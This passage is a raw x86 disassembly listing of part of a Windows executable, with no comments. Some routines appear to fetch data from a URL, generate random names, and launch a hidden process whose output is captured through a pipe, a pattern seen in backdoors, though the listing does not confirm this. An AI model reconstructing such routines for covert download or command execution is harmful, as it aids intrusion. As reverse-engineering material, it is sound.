  40e3fa:	59                   	pop    %ecx
  40e3fb:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
  40e401:	eb d7                	jmp    0x40e3da
  40e403:	68 e8 03 00 00       	push   $0x3e8
  40e408:	ff 15 8c 01 41 00    	call   *0x41018c
  40e40e:	b8 6d e1 40 00       	mov    $0x40e16d,%eax
  40e413:	c3                   	ret
  40e414:	55                   	push   %ebp
  40e415:	8b ec                	mov    %esp,%ebp
  40e417:	83 ec 1c             	sub    $0x1c,%esp
  40e41a:	8b 45 08             	mov    0x8(%ebp),%eax
  40e41d:	83 e8 00             	sub    $0x0,%eax
  40e420:	74 14                	je     0x40e436
  40e422:	48                   	dec    %eax
  40e423:	74 0a                	je     0x40e42f
  40e425:	48                   	dec    %eax
  40e426:	75 16                	jne    0x40e43e
  40e428:	6a 20                	push   $0x20
  40e42a:	59                   	pop    %ecx
  40e42b:	6a 40                	push   $0x40
  40e42d:	eb 0c                	jmp    0x40e43b
  40e42f:	6a 08                	push   $0x8
  40e431:	59                   	pop    %ecx
  40e432:	6a 10                	push   $0x10
  40e434:	eb 05                	jmp    0x40e43b
  40e436:	6a 02                	push   $0x2
  40e438:	59                   	pop    %ecx
  40e439:	6a 04                	push   $0x4
  40e43b:	58                   	pop    %eax
  40e43c:	eb 06                	jmp    0x40e444
  40e43e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e441:	8b 45 08             	mov    0x8(%ebp),%eax
  40e444:	8b 55 0c             	mov    0xc(%ebp),%edx
  40e447:	0b c1                	or     %ecx,%eax
  40e449:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40e44d:	66 0d 01 80          	or     $0x8001,%ax
  40e451:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40e454:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40e457:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40e45a:	8b 55 10             	mov    0x10(%ebp),%edx
  40e45d:	6a 1c                	push   $0x1c
  40e45f:	50                   	push   %eax
  40e460:	6a 01                	push   $0x1
  40e462:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40e465:	ff 15 20 04 41 00    	call   *0x410420
  40e46b:	c9                   	leave
  40e46c:	c3                   	ret
  40e46d:	55                   	push   %ebp
  40e46e:	8b ec                	mov    %esp,%ebp
  40e470:	83 ec 1c             	sub    $0x1c,%esp
  40e473:	66 8b 45 08          	mov    0x8(%ebp),%ax
  40e477:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  40e47b:	66 89 45 e8          	mov    %ax,-0x18(%ebp)
  40e47f:	56                   	push   %esi
  40e480:	8b 35 20 04 41 00    	mov    0x410420,%esi
  40e486:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40e489:	6a 1c                	push   $0x1c
  40e48b:	50                   	push   %eax
  40e48c:	6a 01                	push   $0x1
  40e48e:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  40e495:	ff d6                	call   *%esi
  40e497:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40e49a:	6a 1c                	push   $0x1c
  40e49c:	50                   	push   %eax
  40e49d:	6a 01                	push   $0x1
  40e49f:	c7 45 ec 02 00 00 00 	movl   $0x2,-0x14(%ebp)
  40e4a6:	ff d6                	call   *%esi
  40e4a8:	5e                   	pop    %esi
  40e4a9:	c9                   	leave
  40e4aa:	c3                   	ret
  40e4ab:	b9 08 5b 41 00       	mov    $0x415b08,%ecx
  40e4b0:	ff 15 58 02 41 00    	call   *0x410258
  40e4b6:	50                   	push   %eax
  40e4b7:	e8 78 0d 00 00       	call   0x40f234
  40e4bc:	f7 d8                	neg    %eax
  40e4be:	1b c0                	sbb    %eax,%eax
  40e4c0:	59                   	pop    %ecx
  40e4c1:	f7 d8                	neg    %eax
  40e4c3:	c3                   	ret
  40e4c4:	e9 00 00 00 00       	jmp    0x40e4c9
  40e4c9:	68 30 18 41 00       	push   $0x411830
  40e4ce:	68 24 18 41 00       	push   $0x411824
  40e4d3:	ff 15 40 01 41 00    	call   *0x410140
  40e4d9:	50                   	push   %eax
  40e4da:	ff 15 44 01 41 00    	call   *0x410144
  40e4e0:	a3 78 5b 41 00       	mov    %eax,0x415b78
  40e4e5:	c3                   	ret
  40e4e6:	55                   	push   %ebp
  40e4e7:	8b ec                	mov    %esp,%ebp
  40e4e9:	81 ec 18 01 00 00    	sub    $0x118,%esp
  40e4ef:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  40e4f5:	68 04 01 00 00       	push   $0x104
  40e4fa:	50                   	push   %eax
  40e4fb:	6a 00                	push   $0x0
  40e4fd:	ff 15 6c 00 41 00    	call   *0x41006c
  40e503:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40e506:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40e509:	50                   	push   %eax
  40e50a:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  40e510:	50                   	push   %eax
  40e511:	ff 15 4c 02 41 00    	call   *0x41024c
  40e517:	a1 9c 02 41 00       	mov    0x41029c,%eax
  40e51c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40e51f:	ff 30                	push   (%eax)
  40e521:	68 44 18 41 00       	push   $0x411844
  40e526:	ff 15 f0 01 41 00    	call   *0x4101f0
  40e52c:	50                   	push   %eax
  40e52d:	6a 00                	push   $0x0
  40e52f:	ff 75 08             	push   0x8(%ebp)
  40e532:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40e535:	ff 15 98 02 41 00    	call   *0x410298
  40e53b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40e53e:	ff 15 54 02 41 00    	call   *0x410254
  40e544:	8b 45 08             	mov    0x8(%ebp),%eax
  40e547:	c9                   	leave
  40e548:	c3                   	ret
  40e549:	55                   	push   %ebp
  40e54a:	8b ec                	mov    %esp,%ebp
  40e54c:	81 ec 4c 02 00 00    	sub    $0x24c,%esp
  40e552:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40e555:	c7 45 f8 10 00 00 00 	movl   $0x10,-0x8(%ebp)
  40e55c:	50                   	push   %eax
  40e55d:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40e560:	50                   	push   %eax
  40e561:	6a 01                	push   $0x1
  40e563:	ff 15 98 5b 41 00    	call   *0x415b98
  40e569:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40e56c:	c7 45 f4 00 01 00 00 	movl   $0x100,-0xc(%ebp)
  40e573:	50                   	push   %eax
  40e574:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40e57a:	50                   	push   %eax
  40e57b:	ff 15 38 00 41 00    	call   *0x410038
  40e581:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40e587:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40e58a:	50                   	push   %eax
  40e58b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40e58e:	50                   	push   %eax
  40e58f:	68 48 18 41 00       	push   $0x411848
  40e594:	ff 15 bc 02 41 00    	call   *0x4102bc
  40e59a:	50                   	push   %eax
  40e59b:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40e59e:	50                   	push   %eax
  40e59f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40e5a2:	50                   	push   %eax
  40e5a3:	e8 a8 16 00 00       	call   0x40fc50
  40e5a8:	83 c4 0c             	add    $0xc,%esp
  40e5ab:	50                   	push   %eax
  40e5ac:	ff 75 08             	push   0x8(%ebp)
  40e5af:	e8 8a 16 00 00       	call   0x40fc3e
  40e5b4:	83 c4 0c             	add    $0xc,%esp
  40e5b7:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40e5ba:	ff 15 c0 02 41 00    	call   *0x4102c0
  40e5c0:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40e5c3:	ff 15 c0 02 41 00    	call   *0x4102c0
  40e5c9:	8b 45 08             	mov    0x8(%ebp),%eax
  40e5cc:	c9                   	leave
  40e5cd:	c3                   	ret
  40e5ce:	55                   	push   %ebp
  40e5cf:	8b ec                	mov    %esp,%ebp
  40e5d1:	83 ec 20             	sub    $0x20,%esp
  40e5d4:	6a 00                	push   $0x0
  40e5d6:	68 54 18 41 00       	push   $0x411854
  40e5db:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40e5de:	68 00 00 00 80       	push   $0x80000000
  40e5e3:	50                   	push   %eax
  40e5e4:	e8 08 a9 ff ff       	call   0x408ef1
  40e5e9:	83 c4 10             	add    $0x10,%esp
  40e5ec:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e5ef:	6a 00                	push   $0x0
  40e5f1:	68 4c 18 41 00       	push   $0x41184c
  40e5f6:	ff 15 20 02 41 00    	call   *0x410220
  40e5fc:	83 c0 04             	add    $0x4,%eax
  40e5ff:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e602:	50                   	push   %eax
  40e603:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40e606:	6a 00                	push   $0x0
  40e608:	50                   	push   %eax
  40e609:	ff 15 98 02 41 00    	call   *0x410298
  40e60f:	50                   	push   %eax
  40e610:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e613:	ff 15 64 02 41 00    	call   *0x410264
  40e619:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40e61c:	ff 15 54 02 41 00    	call   *0x410254
  40e622:	68 68 06 41 00       	push   $0x410668
  40e627:	68 60 08 41 00       	push   $0x410860
  40e62c:	83 ec 10             	sub    $0x10,%esp
  40e62f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40e632:	8b cc                	mov    %esp,%ecx
  40e634:	50                   	push   %eax
  40e635:	ff 15 60 02 41 00    	call   *0x410260
  40e63b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40e63e:	50                   	push   %eax
  40e63f:	e8 90 08 00 00       	call   0x40eed4
  40e644:	83 c4 1c             	add    $0x1c,%esp
  40e647:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e64a:	50                   	push   %eax
  40e64b:	ff 15 64 02 41 00    	call   *0x410264
  40e651:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40e654:	ff 15 54 02 41 00    	call   *0x410254
  40e65a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e65d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40e660:	50                   	push   %eax
  40e661:	ff 15 60 02 41 00    	call   *0x410260
  40e667:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e66a:	ff 15 54 02 41 00    	call   *0x410254
  40e670:	8b 45 08             	mov    0x8(%ebp),%eax
  40e673:	c9                   	leave
  40e674:	c3                   	ret
  40e675:	55                   	push   %ebp
  40e676:	8b ec                	mov    %esp,%ebp
  40e678:	83 ec 40             	sub    $0x40,%esp
  40e67b:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40e67e:	c7 45 c0 40 00 00 00 	movl   $0x40,-0x40(%ebp)
  40e685:	50                   	push   %eax
  40e686:	ff 15 34 59 41 00    	call   *0x415934
  40e68c:	8b 45 08             	mov    0x8(%ebp),%eax
  40e68f:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40e692:	89 08                	mov    %ecx,(%eax)
  40e694:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40e697:	89 48 04             	mov    %ecx,0x4(%eax)
  40e69a:	c9                   	leave
  40e69b:	c3                   	ret
  40e69c:	55                   	push   %ebp
  40e69d:	8b ec                	mov    %esp,%ebp
  40e69f:	51                   	push   %ecx
  40e6a0:	51                   	push   %ecx
  40e6a1:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40e6a5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40e6a9:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40e6ac:	50                   	push   %eax
  40e6ad:	e8 c3 ff ff ff       	call   0x40e675
  40e6b2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e6b5:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40e6b8:	59                   	pop    %ecx
  40e6b9:	c9                   	leave
  40e6ba:	c3                   	ret
  40e6bb:	55                   	push   %ebp
  40e6bc:	8b ec                	mov    %esp,%ebp
  40e6be:	83 ec 30             	sub    $0x30,%esp
  40e6c1:	56                   	push   %esi
  40e6c2:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40e6c5:	57                   	push   %edi
  40e6c6:	50                   	push   %eax
  40e6c7:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40e6ca:	ff 15 50 02 41 00    	call   *0x410250
  40e6d0:	6a 06                	push   $0x6
  40e6d2:	be 6c 18 41 00       	mov    $0x41186c,%esi
  40e6d7:	59                   	pop    %ecx
  40e6d8:	8d 7d d0             	lea    -0x30(%ebp),%edi
  40e6db:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40e6dd:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  40e6df:	6a 00                	push   $0x0
  40e6e1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40e6e2:	ff 15 8c 03 41 00    	call   *0x41038c
  40e6e8:	03 05 74 5b 41 00    	add    0x415b74,%eax
  40e6ee:	50                   	push   %eax
  40e6ef:	ff 15 4c 03 41 00    	call   *0x41034c
  40e6f5:	8b 35 50 03 41 00    	mov    0x410350,%esi
  40e6fb:	ff 05 74 5b 41 00    	incl   0x415b74
  40e701:	59                   	pop    %ecx
  40e702:	59                   	pop    %ecx
  40e703:	ff d6                	call   *%esi
  40e705:	6a 1f                	push   $0x1f
  40e707:	99                   	cltd
  40e708:	59                   	pop    %ecx
  40e709:	f7 f9                	idiv   %ecx
  40e70b:	80 c2 04             	add    $0x4,%dl
  40e70e:	0f b6 c2             	movzbl %dl,%eax
  40e711:	85 c0                	test   %eax,%eax
  40e713:	7e 1e                	jle    0x40e733
  40e715:	8b f8                	mov    %eax,%edi
  40e717:	ff d6                	call   *%esi
  40e719:	6a 1a                	push   $0x1a
  40e71b:	99                   	cltd
  40e71c:	59                   	pop    %ecx
  40e71d:	f7 f9                	idiv   %ecx
  40e71f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40e722:	0f b6 c2             	movzbl %dl,%eax
  40e725:	8a 44 05 d0          	mov    -0x30(%ebp,%eax,1),%al
  40e729:	50                   	push   %eax
  40e72a:	ff 15 f8 01 41 00    	call   *0x4101f8
  40e730:	4f                   	dec    %edi
  40e731:	75 e4                	jne    0x40e717
  40e733:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e736:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40e739:	50                   	push   %eax
  40e73a:	ff 15 60 02 41 00    	call   *0x410260
  40e740:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40e743:	ff 15 54 02 41 00    	call   *0x410254
  40e749:	8b 45 08             	mov    0x8(%ebp),%eax
  40e74c:	5f                   	pop    %edi
  40e74d:	5e                   	pop    %esi
  40e74e:	c9                   	leave
  40e74f:	c3                   	ret
  40e750:	55                   	push   %ebp
  40e751:	8b ec                	mov    %esp,%ebp
  40e753:	b8 1c 27 00 00       	mov    $0x271c,%eax
  40e758:	e8 93 15 00 00       	call   0x40fcf0
  40e75d:	8b 45 0c             	mov    0xc(%ebp),%eax
  40e760:	53                   	push   %ebx
  40e761:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40e764:	56                   	push   %esi
  40e765:	80 65 13 00          	andb   $0x0,0x13(%ebp)
  40e769:	33 f6                	xor    %esi,%esi
  40e76b:	56                   	push   %esi
  40e76c:	56                   	push   %esi
  40e76d:	56                   	push   %esi
  40e76e:	6a 01                	push   $0x1
  40e770:	89 30                	mov    %esi,(%eax)
  40e772:	68 88 18 41 00       	push   $0x411888
  40e777:	89 33                	mov    %esi,(%ebx)
  40e779:	ff 15 74 04 41 00    	call   *0x410474
  40e77f:	56                   	push   %esi
  40e780:	68 00 00 00 80       	push   $0x80000000
  40e785:	56                   	push   %esi
  40e786:	56                   	push   %esi
  40e787:	ff 75 08             	push   0x8(%ebp)
  40e78a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40e78d:	50                   	push   %eax
  40e78e:	ff 15 70 04 41 00    	call   *0x410470
  40e794:	3b c6                	cmp    %esi,%eax
  40e796:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40e799:	0f 84 a7 00 00 00    	je     0x40e846
  40e79f:	57                   	push   %edi
  40e7a0:	89 75 10             	mov    %esi,0x10(%ebp)
  40e7a3:	89 75 08             	mov    %esi,0x8(%ebp)
  40e7a6:	8d 45 10             	lea    0x10(%ebp),%eax
  40e7a9:	50                   	push   %eax
  40e7aa:	8d 85 e4 d8 ff ff    	lea    -0x271c(%ebp),%eax
  40e7b0:	68 10 27 00 00       	push   $0x2710
  40e7b5:	50                   	push   %eax
  40e7b6:	ff 75 fc             	push   -0x4(%ebp)
  40e7b9:	ff 15 78 04 41 00    	call   *0x410478
  40e7bf:	85 c0                	test   %eax,%eax
  40e7c1:	74 05                	je     0x40e7c8
  40e7c3:	39 75 10             	cmp    %esi,0x10(%ebp)
  40e7c6:	76 57                	jbe    0x40e81f
  40e7c8:	8b 03                	mov    (%ebx),%eax
  40e7ca:	03 45 10             	add    0x10(%ebp),%eax
  40e7cd:	50                   	push   %eax
  40e7ce:	e8 f9 14 00 00       	call   0x40fccc
  40e7d3:	8b 0b                	mov    (%ebx),%ecx
  40e7d5:	8b 75 08             	mov    0x8(%ebp),%esi
  40e7d8:	8b d1                	mov    %ecx,%edx
  40e7da:	8b f8                	mov    %eax,%edi
  40e7dc:	c1 e9 02             	shr    $0x2,%ecx
  40e7df:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40e7e1:	8b ca                	mov    %edx,%ecx
  40e7e3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40e7e6:	83 e1 03             	and    $0x3,%ecx
  40e7e9:	ff 75 08             	push   0x8(%ebp)
  40e7ec:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40e7ee:	8b 3b                	mov    (%ebx),%edi
  40e7f0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40e7f3:	03 f8                	add    %eax,%edi
  40e7f5:	8b c1                	mov    %ecx,%eax
  40e7f7:	8d b5 e4 d8 ff ff    	lea    -0x271c(%ebp),%esi
  40e7fd:	c1 e9 02             	shr    $0x2,%ecx
  40e800:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40e802:	8b c8                	mov    %eax,%ecx
  40e804:	83 e1 03             	and    $0x3,%ecx
  40e807:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40e809:	e8 1e 14 00 00       	call   0x40fc2c
  40e80e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e811:	59                   	pop    %ecx
  40e812:	89 45 08             	mov    %eax,0x8(%ebp)
  40e815:	8b 45 10             	mov    0x10(%ebp),%eax
  40e818:	01 03                	add    %eax,(%ebx)
  40e81a:	59                   	pop    %ecx
  40e81b:	33 f6                	xor    %esi,%esi
  40e81d:	eb 87                	jmp    0x40e7a6
  40e81f:	ff 33                	push   (%ebx)
  40e821:	e8 a6 14 00 00       	call   0x40fccc
  40e826:	59                   	pop    %ecx
  40e827:	8b 75 08             	mov    0x8(%ebp),%esi
  40e82a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40e82d:	8b f8                	mov    %eax,%edi
  40e82f:	89 01                	mov    %eax,(%ecx)
  40e831:	8b 0b                	mov    (%ebx),%ecx
  40e833:	8b c1                	mov    %ecx,%eax
  40e835:	c1 e9 02             	shr    $0x2,%ecx
  40e838:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40e83a:	8b c8                	mov    %eax,%ecx
  40e83c:	83 e1 03             	and    $0x3,%ecx
  40e83f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40e841:	c6 45 13 01          	movb   $0x1,0x13(%ebp)
  40e845:	5f                   	pop    %edi
  40e846:	ff 75 f4             	push   -0xc(%ebp)
  40e849:	8b 35 6c 04 41 00    	mov    0x41046c,%esi
  40e84f:	ff d6                	call   *%esi
  40e851:	ff 75 fc             	push   -0x4(%ebp)
  40e854:	ff d6                	call   *%esi
  40e856:	8a 45 13             	mov    0x13(%ebp),%al
  40e859:	5e                   	pop    %esi
  40e85a:	5b                   	pop    %ebx
  40e85b:	c9                   	leave
  40e85c:	c3                   	ret
  40e85d:	55                   	push   %ebp
  40e85e:	8b ec                	mov    %esp,%ebp
  40e860:	81 ec 04 02 00 00    	sub    $0x204,%esp
  40e866:	ff 15 e0 03 41 00    	call   *0x4103e0
  40e86c:	8d 8d fc fd ff ff    	lea    -0x204(%ebp),%ecx
  40e872:	68 00 02 00 00       	push   $0x200
  40e877:	51                   	push   %ecx
  40e878:	50                   	push   %eax
  40e879:	ff 15 18 04 41 00    	call   *0x410418
  40e87f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e882:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40e885:	50                   	push   %eax
  40e886:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40e88c:	50                   	push   %eax
  40e88d:	ff 15 bc 02 41 00    	call   *0x4102bc
  40e893:	8b 45 08             	mov    0x8(%ebp),%eax
  40e896:	c9                   	leave
  40e897:	c3                   	ret
  40e898:	55                   	push   %ebp
  40e899:	8b ec                	mov    %esp,%ebp
  40e89b:	51                   	push   %ecx
  40e89c:	51                   	push   %ecx
  40e89d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40e8a0:	c7 45 f8 08 00 00 00 	movl   $0x8,-0x8(%ebp)
  40e8a7:	50                   	push   %eax
  40e8a8:	ff 15 78 5b 41 00    	call   *0x415b78
  40e8ae:	ff 15 b0 00 41 00    	call   *0x4100b0
  40e8b4:	2b 45 fc             	sub    -0x4(%ebp),%eax
  40e8b7:	c9                   	leave
  40e8b8:	c3                   	ret
  40e8b9:	55                   	push   %ebp
  40e8ba:	8b ec                	mov    %esp,%ebp
  40e8bc:	b8 44 c4 00 00       	mov    $0xc444,%eax
  40e8c1:	e8 2a 14 00 00       	call   0x40fcf0
  40e8c6:	53                   	push   %ebx
  40e8c7:	33 db                	xor    %ebx,%ebx
  40e8c9:	f6 05 70 5b 41 00 01 	testb  $0x1,0x415b70
  40e8d0:	56                   	push   %esi
  40e8d1:	57                   	push   %edi
  40e8d2:	88 5d fe             	mov    %bl,-0x2(%ebp)
  40e8d5:	88 5d fd             	mov    %bl,-0x3(%ebp)
  40e8d8:	be 80 5b 41 00       	mov    $0x415b80,%esi
  40e8dd:	75 1e                	jne    0x40e8fd
  40e8df:	80 0d 70 5b 41 00 01 	orb    $0x1,0x415b70
  40e8e6:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40e8e9:	50                   	push   %eax
  40e8ea:	8b ce                	mov    %esi,%ecx
  40e8ec:	ff 15 50 02 41 00    	call   *0x410250
  40e8f2:	68 d2 ec 40 00       	push   $0x40ecd2
  40e8f7:	e8 be 13 00 00       	call   0x40fcba
  40e8fc:	59                   	pop    %ecx
  40e8fd:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40e900:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40e903:	50                   	push   %eax
  40e904:	ff 15 50 02 41 00    	call   *0x410250
  40e90a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40e90d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40e910:	50                   	push   %eax
  40e911:	ff 15 50 02 41 00    	call   *0x410250
  40e917:	8d 45 0c             	lea    0xc(%ebp),%eax
  40e91a:	68 98 18 41 00       	push   $0x411898
  40e91f:	50                   	push   %eax
  40e920:	ff 15 38 02 41 00    	call   *0x410238
  40e926:	59                   	pop    %ecx
  40e927:	84 c0                	test   %al,%al
  40e929:	59                   	pop    %ecx
  40e92a:	74 11                	je     0x40e93d
  40e92c:	68 94 18 41 00       	push   $0x411894
  40e931:	8b ce                	mov    %esi,%ecx
  40e933:	ff 15 d8 02 41 00    	call   *0x4102d8
  40e939:	c6 45 fe 01          	movb   $0x1,-0x2(%ebp)
  40e93d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40e940:	53                   	push   %ebx
  40e941:	50                   	push   %eax
  40e942:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40e945:	50                   	push   %eax
  40e946:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40e949:	50                   	push   %eax
  40e94a:	c7 45 c0 0c 00 00 00 	movl   $0xc,-0x40(%ebp)
  40e951:	c7 45 c8 01 00 00 00 	movl   $0x1,-0x38(%ebp)
  40e958:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
  40e95b:	ff 15 10 01 41 00    	call   *0x410110
  40e961:	6a 11                	push   $0x11
  40e963:	33 c0                	xor    %eax,%eax
  40e965:	59                   	pop    %ecx
  40e966:	8d bd 0c ff ff ff    	lea    -0xf4(%ebp),%edi
  40e96c:	f3 ab                	rep stos %eax,%es:(%edi)
  40e96e:	6a f6                	push   $0xfffffff6
  40e970:	c7 85 0c ff ff ff 44 	movl   $0x44,-0xf4(%ebp)
  40e977:	00 00 00 
  40e97a:	c7 85 38 ff ff ff 01 	movl   $0x101,-0xc8(%ebp)
  40e981:	01 00 00 
  40e984:	66 89 9d 3c ff ff ff 	mov    %bx,-0xc4(%ebp)
  40e98b:	ff 15 0c 01 41 00    	call   *0x41010c
  40e991:	89 85 44 ff ff ff    	mov    %eax,-0xbc(%ebp)
  40e997:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40e99a:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40e9a0:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  40e9a6:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40e9a9:	8b ce                	mov    %esi,%ecx
  40e9ab:	50                   	push   %eax
  40e9ac:	8d 85 0c ff ff ff    	lea    -0xf4(%ebp),%eax
  40e9b2:	50                   	push   %eax
  40e9b3:	ff 15 58 02 41 00    	call   *0x410258
  40e9b9:	50                   	push   %eax
  40e9ba:	53                   	push   %ebx
  40e9bb:	53                   	push   %ebx
  40e9bc:	6a 01                	push   $0x1
  40e9be:	53                   	push   %ebx
  40e9bf:	53                   	push   %ebx
  40e9c0:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40e9c3:	ff 15 58 02 41 00    	call   *0x410258
  40e9c9:	50                   	push   %eax
  40e9ca:	53                   	push   %ebx
  40e9cb:	ff 15 ac 00 41 00    	call   *0x4100ac
  40e9d1:	85 c0                	test   %eax,%eax
  40e9d3:	68 f4 01 00 00       	push   $0x1f4
  40e9d8:	0f 95 45 ff          	setne  -0x1(%ebp)
  40e9dc:	ff 15 8c 01 41 00    	call   *0x41018c
  40e9e2:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  40e9e5:	0f 84 43 02 00 00    	je     0x40ec2e
  40e9eb:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40e9ee:	53                   	push   %ebx
  40e9ef:	50                   	push   %eax
  40e9f0:	53                   	push   %ebx
  40e9f1:	53                   	push   %ebx
  40e9f2:	53                   	push   %ebx
  40e9f3:	ff 75 f4             	push   -0xc(%ebp)
  40e9f6:	ff 15 08 01 41 00    	call   *0x410108
  40e9fc:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40e9ff:	76 1c                	jbe    0x40ea1d
  40ea01:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40ea04:	53                   	push   %ebx
  40ea05:	50                   	push   %eax
  40ea06:	8d 85 bc 3b ff ff    	lea    -0xc444(%ebp),%eax
  40ea0c:	68 50 c3 00 00       	push   $0xc350
  40ea11:	50                   	push   %eax
  40ea12:	ff 75 f4             	push   -0xc(%ebp)
  40ea15:	ff 15 04 01 41 00    	call   *0x410104
  40ea1b:	eb 03                	jmp    0x40ea20
  40ea1d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40ea20:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40ea23:	76 39                	jbe    0x40ea5e
  40ea25:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40ea28:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  40ea2e:	50                   	push   %eax
  40ea2f:	8d 85 bc 3b ff ff    	lea    -0xc444(%ebp),%eax
  40ea35:	ff 75 f8             	push   -0x8(%ebp)
  40ea38:	50                   	push   %eax
  40ea39:	ff 15 70 02 41 00    	call   *0x410270
  40ea3f:	50                   	push   %eax
  40ea40:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40ea43:	ff 15 94 02 41 00    	call   *0x410294
  40ea49:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  40ea4f:	ff 15 54 02 41 00    	call   *0x410254
  40ea55:	c6 45 fd 01          	movb   $0x1,-0x3(%ebp)
  40ea59:	e9 9b 01 00 00       	jmp    0x40ebf9
  40ea5e:	38 5d fd             	cmp    %bl,-0x3(%ebp)
  40ea61:	0f 85 92 01 00 00    	jne    0x40ebf9
  40ea67:	bf 90 18 41 00       	mov    $0x411890,%edi
  40ea6c:	53                   	push   %ebx
  40ea6d:	57                   	push   %edi
  40ea6e:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40ea71:	ff 15 20 02 41 00    	call   *0x410220
  40ea77:	8b 0d 9c 02 41 00    	mov    0x41029c,%ecx
  40ea7d:	3b 01                	cmp    (%ecx),%eax
  40ea7f:	0f 84 74 01 00 00    	je     0x40ebf9
  40ea85:	ff 31                	push   (%ecx)
  40ea87:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40ea8a:	53                   	push   %ebx
  40ea8b:	57                   	push   %edi
  40ea8c:	ff 15 20 02 41 00    	call   *0x410220
  40ea92:	40                   	inc    %eax
